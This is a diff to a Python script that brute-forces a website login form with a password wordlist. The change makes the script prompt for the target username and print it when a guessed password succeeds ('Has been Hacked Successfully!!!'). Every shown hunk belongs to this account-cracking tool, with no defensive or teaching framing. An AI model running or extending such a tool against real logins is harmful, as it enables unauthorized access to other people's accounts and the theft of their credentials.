@@ -39,7 +39,7 @@ u = raw_input("User Form: ")
 p = raw_input("Password Form: ")
 
 #email
-#email = str(raw_input("\n\nUsername: "))
+email = str(raw_input("\n\nUsername: "))
 un = 'bypass.txt'
 wp = 'wordlist.txt'
 #wordlist
@@ -79,8 +79,8 @@ def brute(password):
 	sub = br.submit()
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
-			print("\n[+] Username: " + un + " Password: {}".format(password))
-			print("[+] " + un + " Has been Hacked Successfully!!!") 
+			print("\n[+] Username: " + email + " Password: {}".format(password))
+			print("[+] " + email + " Has been Hacked Successfully!!!") 
 			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
 			if m == 'y':
 				exit()
@@ -102,7 +102,7 @@ def welcome():
 	total = open(passwordlist,"r")
 	total = total.readlines()
 	print
-	print (" [*] Account to crack : {}".format(un))
+	print (" [*] Account to crack : {}".format(email))
 	print (' [*] Possible Passwords: ')
 	print (" [*] Cracking, please wait ...\n\n")
 
